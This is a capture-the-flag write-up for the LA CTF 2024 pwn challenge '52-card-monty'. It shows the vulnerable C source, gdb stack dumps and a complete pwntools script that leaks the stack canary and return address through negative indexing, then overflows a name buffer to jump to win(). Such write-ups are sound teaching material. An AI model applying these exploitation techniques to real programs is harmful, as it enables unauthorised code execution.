+++
title = 'LA CTF 2024 - pwn/52-card-monty'
date = 2024-02-21T20:20:50-05:00
draft = false
+++

Again we are given c code along with a binary and a Dockerfile.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define DECK_SIZE 0x52
#define QUEEN 1111111111

void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  srand(time(NULL));
}

void win() {
  char flag[256];

  FILE *flagfile = fopen("flag.txt", "r");

  if (flagfile == NULL) {
    puts("Cannot read flag.txt.");
  } else {
    fgets(flag, 256, flagfile);
    flag[strcspn(flag, "\n")] = '\0';
    puts(flag);
  }
}

long lrand() {
  long higher, lower;
  higher = (((long)rand()) << 32);
  lower = (long)rand();
  return higher + lower;
}

void game() {
  int index;
  long leak;
  long cards[52] = {0};
  char name[20];

  for (int i = 0; i < 52; ++i) {
    cards[i] = lrand();
  }

  index = rand() % 52;
  cards[index] = QUEEN;

  printf("==============================\n");

  printf("index of your first peek? ");
  scanf("%d", &index);
  leak = cards[index % DECK_SIZE];
  cards[index % DECK_SIZE] = cards[0];
  cards[0] = leak;
  printf("Peek 1: %lu\n", cards[0]);

  printf("==============================\n");

  printf("index of your second peek? ");
  scanf("%d", &index);
  leak = cards[index % DECK_SIZE];
  cards[index % DECK_SIZE] = cards[0];
  cards[0] = leak;
  printf("Peek 2: %lu\n", cards[0]);

  printf("==============================\n");

  printf("Show me the lady! ");
  scanf("%d", &index);

  printf("==============================\n");

  if (cards[index] == QUEEN) {
    printf("You win!\n");
  } else {
    printf("Just missed. Try again.\n");
  }

  printf("==============================\n");

  printf("Add your name to the leaderboard.\n");
  getchar();
  printf("Name: ");
  fgets(name, 52, stdin);

  printf("==============================\n");

  printf("Thanks for playing, %s!\n", name);
}

int main() {
  setup();
  printf("Welcome to 52-card monty!\n");
  printf("The rules of the game are simple. You are trying to guess which card "
         "is correct. You get two peeks. Show me the lady!\n");
  game();
  return 0;
}
```

The program is a 3 card monty game with 52 cards inssead of 3. The queen is placed randomly in the deck and we can peek twice into the deck before guessing where the queen is. After we guess, We get to put our name on the leaderboard even if we didnt guess correctly.


```c
  printf("Add your name to the leaderboard.\n");
  getchar();
  printf("Name: ");
  fgets(name, 52, stdin);
  ```

  This is our buffer overflow as we can write 52 bytes into a 20 byte buffer. We can use this to get to the win function and get the flag. Taking a look at the file with checksec, we see that PIE is enabled and we have a canary. So we need to leak a memory address as well as the canary.


  ```
checksec --file=monty
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols        No    0               2               monty

  ```

```c  
printf("index of your first peek? ");
  scanf("%d", &index);
  leak = cards[index % DECK_SIZE];
  cards[index % DECK_SIZE] = cards[0];
  cards[0] = leak;
  printf("Peek 1: %lu\n", cards[0]);
  ```

  Taking a look at the peaks, there is no input checking so we can pass a negative number into index and peek up the stack! 

  Lets take a look in gdb. Running the program and setting a breakpoint right before we enter in our first peak value


  ```
[#0] 0x7ffff7ec2a5d → __GI___libc_read(fd=0x0, buf=0x7ffff7f9eb23 <_IO_2_1_stdin_+131>, nbytes=0x1)
[#1] 0x7ffff7e4bd74 → _IO_new_file_underflow(fp=0x7ffff7f9eaa0 <_IO_2_1_stdin_>)
[#2] 0x7ffff7e4d102 → __GI__IO_default_uflow(fp=0x7ffff7f9eaa0 <_IO_2_1_stdin_>)
[#3] 0x7ffff7e28b6e → __vfscanf_internal(s=<optimized out>, format=<optimized out>, argptr=0x7fffffffdb90, mode_flags=0x2)
[#4] 0x7ffff7e1d77e → __isoc99_scanf(format=<optimized out>)
[#5] 0x5555555553f1 → game()
[#6] 0x55555555567e → main()

gef➤  b *0x5555555553f1
Breakpoint 1 at 0x5555555553f1

  ```

Lets continue and examine the stack after we input a value

```
gef➤  x/-50gx $sp
0x7fffffffdae0: 0x0000000000000000      0x0000000000000000
0x7fffffffdaf0: 0x00007fffffffdac0      0x00007fffffffdac0
0x7fffffffdb00: 0x2525252525252525      0x2525252525252525
0x7fffffffdb10: 0x0000000000000000      0x0000000000000000
0x7fffffffdb20: 0x0000000000000000      0x0000000000000000
0x7fffffffdb30: 0x0000000000000000      0x0000000000ff0000
0x7fffffffdb40: 0x0000000000000120      0xe15d5cb66eeba700
0x7fffffffdb50: 0x0000000000000048      0x00007fffffffdf68
0x7fffffffdb60: 0x0000000000000000      0x00007fffffffdf78
0x7fffffffdb70: 0x0000000000000000      0x00007ffff7ffd000
0x7fffffffdb80: 0x00007fffffffde40      0x00007ffff7e1d77e
0x7fffffffdb90: 0x0000003000000008      0x00007fffffffdc70
0x7fffffffdba0: 0x00007fffffffdbb0      0xe15d5cb66eeba700
0x7fffffffdbb0: 0x0000000000000000      0x00007fffffffdc70
0x7fffffffdbc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbd0: 0x0000000000000000      0x00007ffff7f9e280
0x7fffffffdbe0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbf0: 0x00007ffff7ffd000      0x00007ffff7e4bbc9
0x7fffffffdc00: 0x00007ffff7f9f780      0x00007ffff7e4c053
0x7fffffffdc10: 0x000000000000001e      0x0000555555556030
0x7fffffffdc20: 0x00007ffff7f9f780      0x00007ffff7e40cfa
0x7fffffffdc30: 0x00007fffffffdf68      0x00007ffff7e0bd14
0x7fffffffdc40: 0x00007fffffffdf68      0x00007fffffffde40
0x7fffffffdc50: 0x00007fffffffdf68      0x00007ffff7ffe2d0
0x7fffffffdc60: 0x000000000000000a      0x00005555555553f1
gef➤  x/10gx $sp
0x7fffffffdc70: 0x0000003400000005      0x0000000000000000
0x7fffffffdc80: 0x5049933c3c3399bc      0x2d2c06c91180ab90
0x7fffffffdc90: 0x5fad3441288e7eda      0x62550ac03a9d31a8
0x7fffffffdca0: 0x0a8204627d647dad      0x4de13c086377b86f
0x7fffffffdcb0: 0x6954d30e0a27501c      0x564c1b9800debacf
gef➤  x/i 0x00005555555553f1
=> 0x5555555553f1 <game+222>:   mov    eax,DWORD PTR [rbp-0x1d0]
gef➤  

```

```
0x7fffffffdc70: 0x0000003400000005      0x0000000000000000
0x7fffffffdc80: 0x5049933c3c3399bc      0x2d2c06c91180ab90
```

Looking here we can see where the random card values start. Counting up 3 addresses we see the address we set the breakpoint on, which examianing with x/i which gives us the address as an instruction, we see tahat cards[-3] will give us game+222. We have our leak and can use this to calculate the address of win function.

```
0x7fffffffdba0: 0x00007fffffffdbb0      0xe15d5cb66eeba700
```

Looking up the stack, the value 0xe15d5cb66eeba700 jumps out as the canary because it is null terminated. Using the canary function in gdb we can confirm this is the canary.

```
gef➤  canary
[+] The canary of process 24230 is at 0x7ffff7dc8768, value is 0xe15d5cb66eeba700
```
So now we know that cards[-27] will give us the canary. Next we need the offset between game+222 and our win fucntion.

```
gef➤  x/x *win
0x555555555239 <win>:   0x20ec8148e5894855
```

0x00005555555553f1 - 0x555555555239 = 440

Great! Now lets put it all together. 
Final solve script:

```python
from pwn import *
import warnings


context.log_level = "DEBUG"
warnings.filterwarnings("ignore",category=BytesWarning)

target = remote("chall.lac.tf", 31132)

target.recvuntil(b"peek? ")
target.sendline("-3")
target.recvuntil(b"Peek 1: ")
leak = int(target.recvline().strip())
log.info(hex(leak))

target.sendline("-27")
target.recvuntil(b"Peek 2: ")
canary = int(target.recvline().strip())
log.info(hex(canary))


win = leak - 440

payload = b'A' * 24
payload += p64(canary)
payload += b'A' * 8
payload += p64(win)

target.recvuntil("lady! ")
target.sendline("0")

target.recvuntil("Name: ")
target.sendline(payload)
target.interactive()

```


```
lactf{m0n7y_533_m0n7y_d0}
```